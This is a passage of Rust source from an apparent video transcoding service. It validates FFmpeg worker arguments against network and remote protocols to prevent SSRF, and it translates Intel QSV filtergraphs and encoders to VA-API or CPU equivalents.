        // Any other `<scheme>://` (http, https, rtsp, udp, unix, gopher, hls+http, etc.)
        // is treated as a network/remote/socket protocol.
        return true;
    }

    // Single-colon `<proto>:<rest>` without `//`.
    if proto == "concat" {
        return rest
            .split('|')
            .any(|segment| spec_uses_network_protocol(segment, depth + 1));
    }

    if WRAPPER_PROTOCOLS.contains(&proto.as_str()) {
        return spec_uses_network_protocol(rest, depth + 1);
    }

    if proto.contains('+') {
        let parts: Vec<&str> = proto.split('+').collect();
        if parts.iter().any(|p| NETWORK_PROTOCOLS.contains(p)) {
            return true;
        }
        if parts.iter().all(|p| !p.is_empty()) {
            if parts.contains(&"concat") {
                return rest
                    .split('|')
                    .any(|segment| spec_uses_network_protocol(segment, depth + 1));
            }
            if parts
                .iter()
                .all(|p| WRAPPER_PROTOCOLS.contains(p) || LOCAL_BASE_PROTOCOLS.contains(p))
            {
                if parts.iter().any(|p| WRAPPER_PROTOCOLS.contains(p)) {
                    return spec_uses_network_protocol(rest, depth + 1);
                }
                return false;
            }
        }
        return false;
    }

    if NETWORK_PROTOCOLS.contains(&proto.as_str()) {
        return true;
    }

    if LOCAL_BASE_PROTOCOLS.contains(&proto.as_str()) {
        return false;
    }

    // Unknown single-colon prefixes without `//` (such as local filenames `Movie: Part 1.mkv`)
    // are not network protocols.
    false
}

/// Checks an output specification, including FFmpeg `-f tee` syntax (`[opts]url|[opts]url`).
fn output_spec_uses_network_protocol(spec: &str) -> bool {
    if spec_uses_network_protocol(spec, 0) {
        return true;
    }
    if spec.starts_with('[') {
        for segment in spec.split('|') {
            let trimmed = segment.trim();
            let candidate = if trimmed.starts_with('[') {
                if let Some(close) = trimmed.find(']') {
                    trimmed[close + 1..].trim()
                } else {
                    trimmed
                }
            } else {
                trimmed
            };
            if spec_uses_network_protocol(candidate, 0) {
                return true;
            }
        }
    }
    false
}

/// Splits a filter's argument string on unquoted, unescaped `:`.
fn split_filter_args(args: &str) -> Vec<&str> {
    let mut parts = Vec::new();
    let bytes = args.as_bytes();
    let mut start = 0usize;
    let mut i = 0usize;
    let mut in_single = false;
    let mut in_double = false;
    let mut escaped = false;

    while i < bytes.len() {
        let b = bytes[i];
        if escaped {
            escaped = false;
            i += 1;
            continue;
        }
        match b {
            b'\\' if !in_single => escaped = true,
            b'\'' if !in_double => in_single = !in_single,
            b'"' if !in_single => in_double = !in_double,
            b':' if !in_single && !in_double => {
                parts.push(&args[start..i]);
                start = i + 1;
            }
            _ => {}
        }
        i += 1;
    }
    if start <= args.len() {
        parts.push(&args[start..]);
    }
    parts
}

/// Unquotes and unescapes an FFmpeg filter argument value (such as `http\://...` or `'https://...'`).
fn unescape_filter_value(raw: &str) -> String {
    let trimmed = raw.trim();
    if trimmed.len() >= 2 && trimmed.starts_with('\'') && trimmed.ends_with('\'') {
        return trimmed[1..trimmed.len() - 1].to_string();
    }
    let body = if trimmed.len() >= 2 && trimmed.starts_with('"') && trimmed.ends_with('"') {
        &trimmed[1..trimmed.len() - 1]
    } else {
        trimmed
    };
    let mut out = String::with_capacity(body.len());
    let mut chars = body.chars();
    while let Some(ch) = chars.next() {
        if ch == '\\' {
            if let Some(next) = chars.next() {
                out.push(next);
            } else {
                out.push('\\');
            }
        } else {
            out.push(ch);
        }
    }
    out
}

fn is_ascii_filter_option_key(s: &str) -> bool {
    !s.is_empty()
        && s.bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-'))
}

/// Inspects an FFmpeg filtergraph for network filters (`zmq`/`azmq`) or file-loading filters
/// (`movie`, `amovie`, `subtitles`, `ass`, `lut3d`, `sendcmd`, `asendcmd`, `drawtext` file params)
/// referencing remote/network URLs.
fn filtergraph_uses_network_protocol(graph: &str) -> bool {
    for raw_node in split_filtergraph_nodes(graph) {
        let Some((name, args_opt)) = parse_filter_node(raw_node) else {
            continue;
        };
        let lower = name.to_ascii_lowercase();
        if matches!(lower.as_str(), "zmq" | "azmq") {
            return true;
        }
        let Some(args) = args_opt else {
            continue;
        };
        match lower.as_str() {
            "movie" | "amovie" | "subtitles" | "ass" | "lut3d" | "sendcmd" | "asendcmd" => {
                for (idx, part) in split_filter_args(args).into_iter().enumerate() {
                    let trimmed = part.trim();
                    let candidate = if let Some((k, v)) = trimmed.split_once('=') {
                        let key = k.trim();
                        if key.eq_ignore_ascii_case("filename")
                            || key.eq_ignore_ascii_case("f")
                            || key.eq_ignore_ascii_case("file")
                        {
                            Some(unescape_filter_value(v))
                        } else if idx == 0 && !is_ascii_filter_option_key(key) {
                            // Positional URL containing `=` in query parameters (e.g. `movie=https\://host/a?k=v`).
                            Some(unescape_filter_value(trimmed))
                        } else {
                            None
                        }
                    } else if idx == 0 {
                        Some(unescape_filter_value(trimmed))
                    } else {
                        None
                    };
                    if let Some(val) = candidate {
                        if spec_uses_network_protocol(&val, 0) {
                            return true;
                        }
                    }
                }
            }
            "drawtext" => {
                for part in split_filter_args(args) {
                    if let Some((k, v)) = part.trim().split_once('=') {
                        let key = k.trim();
                        if key.eq_ignore_ascii_case("fontfile")
                            || key.eq_ignore_ascii_case("textfile")
                        {
                            let val = unescape_filter_value(v);
                            if spec_uses_network_protocol(&val, 0) {
                                return true;
                            }
                        }
                    }
                }
            }
            _ => {}
        }
    }
    false
}

/// Returns `true` if `args` contains any `-protocol_whitelist` flag whose value is missing,
/// empty, malformed, or permits any protocol outside [`ALLOWED_LOCAL_PROTOCOLS`].
pub fn has_disallowed_protocol_whitelist<S: AsRef<str>>(args: &[S]) -> bool {
    let mut i = 0usize;
    while i < args.len() {
        let arg = args[i].as_ref();
        if arg == "--" {
            break;
        }
        if let Some(val) = arg.strip_prefix("-protocol_whitelist=") {
            if !is_allowed_local_protocol_whitelist(val) {
                return true;
            }
            i += 1;
            continue;
        }
        if arg == "-protocol_whitelist" || arg.starts_with("-protocol_whitelist:") {
            let Some(val) = args.get(i + 1).map(AsRef::as_ref) else {
                return true;
            };
            if !is_allowed_local_protocol_whitelist(val) {
                return true;
            }
            i += 2;
            continue;
        }
        if option_takes_value(arg) {
            i += 2;
            continue;
        }
        i += 1;
    }
    false
}

/// Returns `true` when `args` references any network, remote, or Unix-socket FFmpeg protocol
/// (including nested wrapper specs like `async:http://`, `cache:https://`, `crypto:http://`,
/// `subfile:http://`, `concat:http://...`, compound `hls+http://`, filtergraph URLs, URL-taking
/// options such as `-progress http://...`, positional network outputs, or a caller-supplied
/// `-protocol_whitelist` permitting non-local schemes).
///
/// Local paths (`file://`, `file:/...`, `/media/Movie: Part 1.mkv`), timestamps (`00:01:23`),
/// `pipe:0`, `fd:0`, `-`, `data:`, metadata values, and local-only whitelists return `false`.
pub fn has_network_input<S: AsRef<str>>(args: &[S]) -> bool {
    let mut i = 0usize;
    let mut after_double_dash = false;
    let mut prev_input_format: Option<&str> = None;

    while i < args.len() {
        let arg = args[i].as_ref();
        if after_double_dash {
            if output_spec_uses_network_protocol(arg) {
                return true;
            }
            i += 1;
            continue;
        }
        if arg == "--" {
            after_double_dash = true;
            i += 1;
            continue;
        }

        let next = args.get(i + 1).map(AsRef::as_ref);

        if let Some(val) = arg.strip_prefix("-protocol_whitelist=") {
            if !is_allowed_local_protocol_whitelist(val) {
                return true;
            }
            i += 1;
            continue;
        }
        if is_protocol_whitelist_flag(arg) {
            let Some(val) = next else {
                return true;
            };
            if !is_allowed_local_protocol_whitelist(val) {
                return true;
            }
            i += 2;
            continue;
        }

        if arg == "-i" {
            if let Some(val) = next {
                if spec_uses_network_protocol(val, 0) {
                    return true;
                }
                if prev_input_format.is_some_and(|fmt| fmt.eq_ignore_ascii_case("lavfi"))
                    && filtergraph_uses_network_protocol(val)
                {
                    return true;
                }
                prev_input_format = None;
                i += 2;
                continue;
            }
            i += 1;
            continue;
        }

        if arg == "-f" {
            if let Some(val) = next {
                prev_input_format = Some(val);
                i += 2;
                continue;
            }
            i += 1;
            continue;
        }

        if is_any_filter_flag(arg) {
            if let Some(val) = next {
                if filtergraph_uses_network_protocol(val) {
                    return true;
                }
                i += 2;
                continue;
            }
            i += 1;
            continue;
        }

        if is_url_option_flag(arg) {
            if let Some(val) = next {
                if spec_uses_network_protocol(val, 0) {
                    return true;
                }
                i += 2;
                continue;
            }
            i += 1;
            continue;
        }

        if arg == "-http_proxy" {
            if let Some(val) = next {
                if !val.trim().is_empty() {
                    return true;
                }
                i += 2;
                continue;
            }
            return true;
        }

        if option_takes_value(arg) {
            i += 2;
            continue;
        }

        if !arg.starts_with('-') && output_spec_uses_network_protocol(arg) {
            return true;
        }

        i += 1;
    }

    false
}

/// Validates worker `ffmpeg` arguments against SSRF, remote/socket protocols, and caller attempts
/// to widen `-protocol_whitelist` beyond [`ALLOWED_LOCAL_PROTOCOLS`].
pub fn validate_worker_args<S: AsRef<str>>(args: &[S]) -> Result<(), String> {
    if has_disallowed_protocol_whitelist(args) {
        return Err(
            "caller -protocol_whitelist attempts to permit non-local FFmpeg protocols".to_string(),
        );
    }
    if has_network_input(args) {
        return Err(
            "network, remote, or socket FFmpeg protocols are not permitted on transcode workers"
                .to_string(),
        );
    }
    Ok(())
}

/// Enforces [`WORKER_LOCAL_PROTOCOL_WHITELIST`] on every `-i` input (or at the start when no `-i`
/// is present) so `ffmpeg` cannot follow embedded network URLs inside local playlists (e.g. `.m3u8`
/// or `.concat`).
///
/// Caller-supplied local-only `-protocol_whitelist` flags (already validated by
/// [`validate_worker_args`]) are preserved without widening them.
pub fn inject_local_protocol_whitelist<S: AsRef<str>>(args: &[S]) -> Vec<String> {
    let mut out = Vec::with_capacity(args.len() + 4);
    let mut i = 0usize;
    let mut after_double_dash = false;
    let mut input_has_whitelist = false;
    let mut saw_any_input = false;
    let mut saw_any_whitelist = false;

    while i < args.len() {
        let arg = args[i].as_ref();
        if after_double_dash {
            out.push(arg.to_string());
            i += 1;
            continue;
        }
        if arg == "--" {
            after_double_dash = true;
            out.push(arg.to_string());
            i += 1;
            continue;
        }

        if arg == "-protocol_whitelist" || arg.starts_with("-protocol_whitelist:") {
            input_has_whitelist = true;
            saw_any_whitelist = true;
            out.push(arg.to_string());
            if let Some(val) = args.get(i + 1).map(AsRef::as_ref) {
                out.push(val.to_string());
                i += 2;
                continue;
            }
            i += 1;
            continue;
        }

        if arg == "-i" {
            saw_any_input = true;
            if !input_has_whitelist {
                out.push("-protocol_whitelist".to_string());
                out.push(WORKER_LOCAL_PROTOCOL_WHITELIST.to_string());
            }
            out.push(arg.to_string());
            if let Some(val) = args.get(i + 1).map(AsRef::as_ref) {
                out.push(val.to_string());
                input_has_whitelist = false;
                i += 2;
                continue;
            }
            input_has_whitelist = false;
            i += 1;
            continue;
        }

        if option_takes_value(arg) {
            out.push(arg.to_string());
            if let Some(val) = args.get(i + 1).map(AsRef::as_ref) {
                out.push(val.to_string());
                i += 2;
                continue;
            }
            i += 1;
            continue;
        }

        out.push(arg.to_string());
        i += 1;
    }

    if !saw_any_input && !saw_any_whitelist {
        let mut prefixed = Vec::with_capacity(out.len() + 2);
        prefixed.push("-protocol_whitelist".to_string());
        prefixed.push(WORKER_LOCAL_PROTOCOL_WHITELIST.to_string());
        prefixed.extend(out);
        return prefixed;
    }

    out
}

/// Target execution backend selected by cross-backend adaptation planning.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum AdaptedTargetBackend {
    Native,
    Vaapi,
    Qsv,
    Cpu,
}

fn find_first_and_last_input_idx<S: AsRef<str>>(args: &[S]) -> (Option<usize>, Option<usize>) {
    let mut first: Option<usize> = None;
    let mut last: Option<usize> = None;
    let mut i = 0usize;
    while i < args.len() {
        let arg = args[i].as_ref();
        if arg == "--" {
            break;
        }
        if arg == "-i" {
            if first.is_none() {
                first = Some(i);
            }
            last = Some(i);
            i += 2;
            continue;
        }
        if option_takes_value(arg) {
            i += 2;
            continue;
        }
        i += 1;
    }
    (first, last)
}

fn split_unquoted(s: &str, sep: u8) -> Vec<&str> {
    let mut parts = Vec::new();
    let bytes = s.as_bytes();
    let mut start = 0usize;
    let mut i = 0usize;
    let mut in_single = false;
    let mut in_double = false;
    let mut escaped = false;

    while i < bytes.len() {
        let b = bytes[i];
        if escaped {
            escaped = false;
            i += 1;
            continue;
        }
        match b {
            b'\\' if !in_single => escaped = true,
            b'\'' if !in_double => in_single = !in_single,
            b'"' if !in_single => in_double = !in_double,
            other if other == sep && !in_single && !in_double => {
                parts.push(&s[start..i]);
                start = i + 1;
            }
            _ => {}
        }
        i += 1;
    }
    if start <= s.len() {
        parts.push(&s[start..]);
    }
    parts
}

#[derive(Debug, Clone, Copy)]
struct DetailedFilterNode<'a> {
    raw: &'a str,
    leading_pads: &'a str,
    name: &'a str,
    instance: Option<&'a str>,
    args: Option<&'a str>,
    trailing_pads: &'a str,
}

fn parse_detailed_filter_node(node: &str) -> Option<DetailedFilterNode<'_>> {
    let raw = node.trim();
    if raw.is_empty() {
        return None;
    }

    let mut rest = raw;
    loop {
        let trimmed = rest.trim_start();
        if !trimmed.starts_with('[') {
            break;
        }
        let Some(end) = trimmed.find(']') else {
            break;
        };
        rest = &trimmed[end + 1..];
    }

    let body_offset = raw.len() - rest.len();
    let leading_pads = raw[..body_offset].trim();
    let body = raw[body_offset..].trim();
    if body.is_empty() {
        return None;
    }

    let bytes = body.as_bytes();
    let mut in_single = false;
    let mut in_double = false;
    let mut escaped = false;
    let mut split_eq: Option<usize> = None;
    let mut trailing_pad_start: Option<usize> = None;

    for (idx, &b) in bytes.iter().enumerate() {
        if escaped {
            escaped = false;
            continue;
        }
        match b {
            b'\\' if !in_single => escaped = true,
            b'\'' if !in_double => in_single = !in_single,
            b'"' if !in_single => in_double = !in_double,
            b'=' if !in_single && !in_double && split_eq.is_none() => {
                split_eq = Some(idx);
                break;
            }
            b'[' if !in_single && !in_double && split_eq.is_none() => {
                trailing_pad_start = Some(idx);
                break;
            }
            _ => {}
        }
    }

    let (raw_name, args, trailing_pads) = if let Some(eq_idx) = split_eq {
        let raw_args = &body[eq_idx + 1..];
        let ab = raw_args.as_bytes();
        let mut s_q = false;
        let mut d_q = false;
        let mut esc = false;
        let mut last_unquoted_bracket = None;
        let mut closed_pad = false;
        for (idx, &b) in ab.iter().enumerate() {
            if esc {
                esc = false;
                continue;
            }
            match b {
                b'\\' if !s_q => esc = true,
                b'\'' if !d_q => s_q = !s_q,
                b'"' if !s_q => d_q = !d_q,
                b'[' if !s_q && !d_q => {
                    if last_unquoted_bracket.is_none() {
                        last_unquoted_bracket = Some(idx);
                    }
                    closed_pad = false;
                }
                b']' if !s_q && !d_q => closed_pad = last_unquoted_bracket.is_some(),
                other if !s_q && !d_q && closed_pad && !other.is_ascii_whitespace() => {
                    last_unquoted_bracket = None;
                    closed_pad = false;
                }
                _ => {}
            }
        }
        let (a_str, pads) = if let Some(idx) = last_unquoted_bracket {
            if raw_args[idx..].trim_end().ends_with(']') {
                (raw_args[..idx].trim(), raw_args[idx..].trim())
            } else {
                (raw_args.trim(), "")
            }
        } else {
            (raw_args.trim(), "")
        };
        (&body[..eq_idx], Some(a_str), pads)
    } else if let Some(pad_idx) = trailing_pad_start {
        (&body[..pad_idx], None, body[pad_idx..].trim())
    } else {
        (body, None, "")
    };

    let (name, instance) = match raw_name.split_once('@') {
        Some((n, inst)) => (n.trim(), Some(inst.trim()).filter(|s| !s.is_empty())),
        None => (raw_name.trim(), None),
    };
    if name.is_empty() {
        return None;
    }

    Some(DetailedFilterNode {
        raw,
        leading_pads,
        name,
        instance,
        args,
        trailing_pads,
    })
}

fn format_filter_node(
    leading_pads: &str,
    name: &str,
    instance: Option<&str>,
    args: Option<&str>,
    trailing_pads: &str,
) -> String {
    let mut out = String::new();
    out.push_str(leading_pads);
    out.push_str(name);
    if let Some(inst) = instance {
        out.push('@');
        out.push_str(inst);
    }
    if let Some(a) = args {
        if !a.is_empty() {
            out.push('=');
            out.push_str(a);
        }
    }
    out.push_str(trailing_pads);
    out
}

fn qsv_to_vaapi_encoder(enc: &str) -> Option<&'static str> {
    match enc.trim().to_ascii_lowercase().as_str() {
        "h264_qsv" => Some("h264_vaapi"),
        "hevc_qsv" => Some("hevc_vaapi"),
        "av1_qsv" => Some("av1_vaapi"),
        "vp9_qsv" => Some("vp9_vaapi"),
        "mjpeg_qsv" => Some("mjpeg_vaapi"),
        "mpeg2_qsv" => Some("mpeg2_vaapi"),
        _ => None,
    }
}

fn vaapi_to_qsv_encoder(enc: &str) -> Option<&'static str> {
    match enc.trim().to_ascii_lowercase().as_str() {
        "h264_vaapi" => Some("h264_qsv"),
        "hevc_vaapi" => Some("hevc_qsv"),
        _ => None,
    }
}

fn hw_to_cpu_encoder(enc: &str) -> Option<&'static str> {
    match enc.trim().to_ascii_lowercase().as_str() {
        "h264_vaapi" | "h264_qsv" | "h264_nvenc" | "h264_vulkan" | "libx264" => Some("libx264"),
        "hevc_vaapi" | "hevc_qsv" | "hevc_nvenc" | "hevc_vulkan" | "libx265" => Some("libx265"),
        _ => None,
    }
}

fn hw_decoder_to_base_codec(dec: &str) -> Option<&'static str> {
    match dec.trim().to_ascii_lowercase().as_str() {
        "h264_qsv" | "h264_cuvid" => Some("h264"),
        "hevc_qsv" | "hevc_cuvid" => Some("hevc"),
        "av1_qsv" | "av1_cuvid" => Some("av1"),
        "vp9_qsv" | "vp9_cuvid" => Some("vp9"),
        "vp8_qsv" | "vp8_cuvid" => Some("vp8"),
        "mpeg2_qsv" | "mpeg2_cuvid" => Some("mpeg2video"),
        "vc1_qsv" | "vc1_cuvid" => Some("vc1"),
        "mjpeg_qsv" | "mjpeg_cuvid" => Some("mjpeg"),
        _ => None,
    }
}

fn base_decoder_to_qsv(dec: &str) -> Option<&'static str> {
    match dec.trim().to_ascii_lowercase().as_str() {
        "h264" => Some("h264_qsv"),
        "hevc" => Some("hevc_qsv"),
        "vp9" => Some("vp9_qsv"),
        "av1" => Some("av1_qsv"),
        _ => None,
    }
}

fn parse_init_hw_device_name(spec: &str) -> Option<&str> {
    let head = match spec.find(':') {
        Some(colon_idx) => {
            let before = &spec[..colon_idx];
            if before.contains('@') {
                spec
            } else {
                before
            }
        }
        None => spec,
    };
    let type_and_name = head.split('@').next().unwrap_or(head);
    type_and_name
        .split_once('=')
        .map(|(_, name)| name.trim())
        .filter(|n| !n.is_empty())
}

fn format_vaapi_init_spec(
    spec: &str,
    render_node: Option<&str>,
    strip_intel_driver: bool,
    ensure_name: Option<&str>,
) -> String {
    let (head, rest_opt) = match spec.find(':') {
        Some(colon_idx) => {
            let before = &spec[..colon_idx];
            if before.contains('@') {
                (spec, None)
            } else {
                (before, Some(&spec[colon_idx + 1..]))
            }
        }
        None => (spec, None),
    };

    let head_out = if let Some(name) = ensure_name {
        if !head.contains('=') && !head.contains('@') {
            format!("{head}={name}")
        } else {
            head.to_string()
        }
    } else {
        head.to_string()
    };

    if head.contains('@') {
        return head_out;
    }

    let (device, opts): (&str, Vec<&str>) = match rest_opt {
        Some(rest) => {
            let mut parts = rest.split(',');
            let dev = parts.next().unwrap_or("");
            (dev, parts.collect())
        }
        None => ("", Vec::new()),
    };

    let new_device = match render_node {
        Some(node) if device.is_empty() || is_valid_render_node_path(device) => node,
        _ => device,
    };

    let kept_opts: Vec<&str> = opts
        .into_iter()
        .filter(|opt| {
            let t = opt.trim();
            if t.is_empty() {
                return false;
            }
            if strip_intel_driver
                && (t.eq_ignore_ascii_case("driver=ihd") || t.eq_ignore_ascii_case("driver=i965"))
            {
                return false;
            }
            true
        })
        .collect();

    if new_device.is_empty() && kept_opts.is_empty() {
        head_out
    } else if kept_opts.is_empty() {
        format!("{head_out}:{new_device}")
    } else {
        format!("{head_out}:{new_device},{}", kept_opts.join(","))
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum FormatRewriteMode {
    QsvToVaapi,
    VaapiToQsv,
    StripHw,
}

enum FormatRewriteOutcome {
    Unchanged,
    Rewritten(String),
    DropNode,
}

fn rewrite_format_filter_args(args: &str, mode: FormatRewriteMode) -> FormatRewriteOutcome {
    let parts = split_filter_args(args);
    if parts.is_empty() {
        return FormatRewriteOutcome::Unchanged;
    }

    let mut out_parts: Vec<String> = Vec::with_capacity(parts.len());
    let mut changed = false;

    for (idx, part) in parts.iter().enumerate() {
        let trimmed = part.trim();
        let (prefix, pix_list) = if let Some(rest) = trimmed.strip_prefix("pix_fmts=") {
            ("pix_fmts=", rest)
        } else if idx == 0 && !trimmed.contains('=') {
            ("", trimmed)
        } else {
            out_parts.push((*part).to_string());
            continue;
        };

        let mut kept = Vec::new();
        for tok in pix_list.split('|') {
            let t = tok.trim();
            match mode {
                FormatRewriteMode::QsvToVaapi => {
                    if t.eq_ignore_ascii_case("qsv") {
                        kept.push("vaapi");
                        changed = true;
                    } else if !t.is_empty() {
                        kept.push(t);
                    }
                }
                FormatRewriteMode::VaapiToQsv => {
                    if t.eq_ignore_ascii_case("vaapi") {
                        kept.push("qsv");
                        changed = true;
                    } else if !t.is_empty() {
                        kept.push(t);
                    }
                }
                FormatRewriteMode::StripHw => {
                    if parse_hwaccel_name(t).is_some() {
                        changed = true;
                    } else if !t.is_empty() {
                        kept.push(t);
                    }
                }
            }
        }

        if kept.is_empty() {
            return FormatRewriteOutcome::DropNode;
        }
        out_parts.push(format!("{prefix}{}", kept.join("|")));
    }

    if changed {
        FormatRewriteOutcome::Rewritten(out_parts.join(":"))
    } else {
        FormatRewriteOutcome::Unchanged
    }
}

fn rewrite_hwmap_derive_device(
    args: &str,
    from_hw: &str,
    to_hw: &str,
    reject_non_target_gpu: bool,
) -> Result<Option<String>, String> {
    let parts = split_filter_args(args);
    let mut out = Vec::with_capacity(parts.len());
    let mut changed = false;

    for part in parts {
        if let Some((k, v)) = part.split_once('=') {
            if k.trim().eq_ignore_ascii_case("derive_device") {
                let val_lower = v.trim().to_ascii_lowercase();
                if val_lower == from_hw {
                    out.push(format!("{}={to_hw}", k.trim()));
                    changed = true;
                    continue;
                } else if reject_non_target_gpu
                    && matches!(
                        val_lower.as_str(),
                        "opencl" | "vulkan" | "cuda" | "cuvid" | "nvdec"
                    )
                {
                    return Err(format!(
                        "cannot adapt hwmap derive_device={val_lower} to {to_hw}"
                    ));
                }
            }
        }
        out.push(part.to_string());
    }

    if changed {
        Ok(Some(out.join(":")))
    } else {
        Ok(None)
    }
}

fn format_alpha_byte_as_unit_float(alpha: u8) -> String {
    if alpha == 0 {
        return "0".to_string();
    }
    if alpha == 255 {
        return "1".to_string();
    }
    let formatted = format!("{:.6}", f64::from(alpha) / 255.0);
    formatted
        .trim_end_matches('0')
        .trim_end_matches('.')
        .to_string()
}

fn translate_overlay_qsv_to_vaapi_args(args: Option<&str>) -> Result<Option<String>, String> {
    let Some(a) = args.map(str::trim).filter(|s| !s.is_empty()) else {
        return Ok(None);
    };
    let mut out = Vec::new();
    for part in split_filter_args(a) {
        let trimmed = part.trim();
        if trimmed.is_empty() {
            continue;
        }
        let Some((k, v)) = trimmed.split_once('=') else {
            return Err(format!(
                "unsupported positional overlay_qsv argument '{trimmed}' for VA-API adaptation"
            ));
        };
        let key = k.trim().to_ascii_lowercase();
        let val = v.trim();
        match key.as_str() {
            "x" | "y" | "w" | "h" | "eof_action" | "shortest" | "repeatlast" | "ts_sync_mode" => {
                if val.is_empty() {
                    return Err(format!(
                        "empty overlay_qsv option '{key}' for VA-API adaptation"
                    ));
                }
                out.push(format!("{key}={val}"));
            }
            "alpha" => {
                let byte_val = val.parse::<u8>().map_err(|_| {
                    format!(
                        "invalid overlay_qsv alpha value '{val}' (expected integer 0..=255) for VA-API adaptation"
                    )
                })?;
                out.push(format!(
                    "alpha={}",
                    format_alpha_byte_as_unit_float(byte_val)
                ));
            }
            _ => {
                return Err(format!(
                    "unsupported overlay_qsv option '{key}' for VA-API adaptation"
                ));
            }
        }
    }
    if out.is_empty() {
        Ok(None)
    } else {
        Ok(Some(out.join(":")))
    }
}

fn translate_deinterlace_qsv_to_vaapi_args(args: Option<&str>) -> Result<Option<String>, String> {
    let Some(a) = args.map(str::trim).filter(|s| !s.is_empty()) else {
        return Ok(None);
    };
    let mut out = Vec::new();
    for part in split_filter_args(a) {
        let trimmed = part.trim();
        if trimmed.is_empty() {
            continue;
        }
        let Some((k, v)) = trimmed.split_once('=') else {
            return Err(format!(
                "unsupported positional deinterlace_qsv argument '{trimmed}' for VA-API adaptation"
            ));
        };
        let key = k.trim().to_ascii_lowercase();
        let val = v.trim();
        match key.as_str() {
            "mode" => match val.to_ascii_lowercase().as_str() {
                "bob" | "1" => out.push("mode=bob".to_string()),
                "advanced" | "2" => out.push("mode=motion_adaptive".to_string()),
                _ => {
                    return Err(format!(
                        "unsupported deinterlace_qsv mode '{val}' for VA-API adaptation"
                    ));
                }
            },
            "async_depth" => {}
            _ => {
                return Err(format!(
                    "unsupported deinterlace_qsv option '{key}' for VA-API adaptation"
                ));
            }
        }
    }
    if out.is_empty() {
        Ok(None)
    } else {
        Ok(Some(out.join(":")))
    }
}

fn translate_deinterlace_vaapi_to_qsv_args(args: Option<&str>) -> Result<Option<String>, String> {
    let Some(a) = args.map(str::trim).filter(|s| !s.is_empty()) else {
        return Ok(None);
    };
    let mut out = Vec::new();
    for part in split_filter_args(a) {
        let trimmed = part.trim();
        if trimmed.is_empty() {
            continue;
        }
        let Some((k, v)) = trimmed.split_once('=') else {
            return Err(format!(
                "unsupported positional deinterlace_vaapi argument '{trimmed}' for QSV adaptation"
            ));
        };
        let key = k.trim().to_ascii_lowercase();
        let val = v.trim();
        match key.as_str() {
            "mode" => match val.to_ascii_lowercase().as_str() {
                "bob" | "1" => out.push("mode=bob".to_string()),
                "default" | "0" | "motion_adaptive" | "3" | "motion_compensated" | "4" => {
                    out.push("mode=advanced".to_string())
                }
                _ => {
                    return Err(format!(
                        "unsupported deinterlace_vaapi mode '{val}' for QSV adaptation"
                    ));
                }
            },
            "rate" => match val.to_ascii_lowercase().as_str() {
                "frame" | "1" => {}
                _ => {
                    return Err(format!(
                        "unsupported deinterlace_vaapi rate '{val}' for QSV adaptation"
                    ));
                }
            },
            "auto" => match val.to_ascii_lowercase().as_str() {
                "0" | "false" | "no" | "off" => {}
                _ => {
                    return Err(format!(
                        "unsupported deinterlace_vaapi auto '{val}' for QSV adaptation"
                    ));
                }
            },
            _ => {
                return Err(format!(
                    "unsupported deinterlace_vaapi option '{key}' for QSV adaptation"
                ));
            }
        }
    }
    if out.is_empty() {
        Ok(None)
    } else {
        Ok(Some(out.join(":")))
    }
}

fn translate_filtergraph_qsv_to_vaapi(graph: &str) -> Result<String, String> {
    let chains = split_unquoted(graph, b';');
    let mut out_chains = Vec::with_capacity(chains.len());

    for chain in chains {
        let raw_nodes = split_unquoted(chain, b',');
        let mut out_nodes = Vec::with_capacity(raw_nodes.len());

        for raw_node in raw_nodes {
            let Some(node) = parse_detailed_filter_node(raw_node) else {
                if !raw_node.trim().is_empty() {
                    out_nodes.push(raw_node.trim().to_string());
                }
                continue;
            };
            let lower = node.name.to_ascii_lowercase();

            match lower.as_str() {
                "vpp_qsv" => {
                    let mut scale_args = Vec::new();
                    let mut fps_val: Option<String> = None;
                    if let Some(a) = node.args {
                        if !a.is_empty() {
                            for part in split_filter_args(a) {
                                let trimmed = part.trim();
                                if trimmed.is_empty() {
                                    continue;
                                }
                                let Some((k, v)) = trimmed.split_once('=') else {
                                    return Err(format!(
                                        "unsupported positional vpp_qsv argument '{trimmed}'"
                                    ));
                                };
                                let key = k.trim().to_ascii_lowercase();
                                let val = v.trim();
                                match key.as_str() {
                                    "w" | "width" => scale_args.push(format!("w={val}")),
                                    "h" | "height" => scale_args.push(format!("h={val}")),
                                    "format" => {
                                        if !val.eq_ignore_ascii_case("same") {
                                            scale_args.push(format!("format={val}"));
                                        }
                                    }
                                    "extra_hw_frames" => {
                                        scale_args.push(format!("extra_hw_frames={val}"));
                                    }
                                    "framerate" => {
                                        fps_val = Some(val.to_string());
                                    }
                                    "async_depth" => {}
                                    _ => {
                                        return Err(format!(
                                            "unsupported vpp_qsv option '{key}' for VA-API adaptation"
                                        ));
                                    }
                                }
                            }
                        }
                    }

                    if let Some(fps) = fps_val {
                        if scale_args.is_empty() {
                            out_nodes.push(format_filter_node(
                                node.leading_pads,
                                "fps",
                                node.instance,
                                Some(&fps),
                                node.trailing_pads,
                            ));
                        } else {
                            out_nodes.push(format_filter_node(
                                node.leading_pads,
                                "scale_vaapi",
                                node.instance,
                                Some(&scale_args.join(":")),
                                "",
                            ));
                            out_nodes.push(format_filter_node(
                                "",
                                "fps",
                                None,
                                Some(&fps),
                                node.trailing_pads,
                            ));
                        }
                    } else {
                        let joined = scale_args.join(":");
                        let args_ref = if joined.is_empty() {
                            None
                        } else {
                            Some(joined.as_str())
                        };
                        out_nodes.push(format_filter_node(
                            node.leading_pads,
                            "scale_vaapi",
                            node.instance,
                            args_ref,
                            node.trailing_pads,
                        ));
                    }
                }
                "scale_qsv" => {
                    let mut scale_args = Vec::new();
                    if let Some(a) = node.args {
                        if !a.is_empty() {
                            for (idx, part) in split_filter_args(a).into_iter().enumerate() {
                                let trimmed = part.trim();
                                if trimmed.is_empty() {
                                    continue;
                                }
                                if let Some((k, v)) = trimmed.split_once('=') {
                                    let key = k.trim().to_ascii_lowercase();
                                    let val = v.trim();
                                    match key.as_str() {
                                        "w" | "width" => scale_args.push(format!("w={val}")),
                                        "h" | "height" => scale_args.push(format!("h={val}")),
                                        "format" => {
                                            if !val.eq_ignore_ascii_case("same") {
                                                scale_args.push(format!("format={val}"));
                                            }
                                        }
                                        "extra_hw_frames" => {
                                            scale_args.push(format!("extra_hw_frames={val}"));
                                        }
                                        "async_depth" | "mode" => {}
                                        _ => {
                                            return Err(format!(
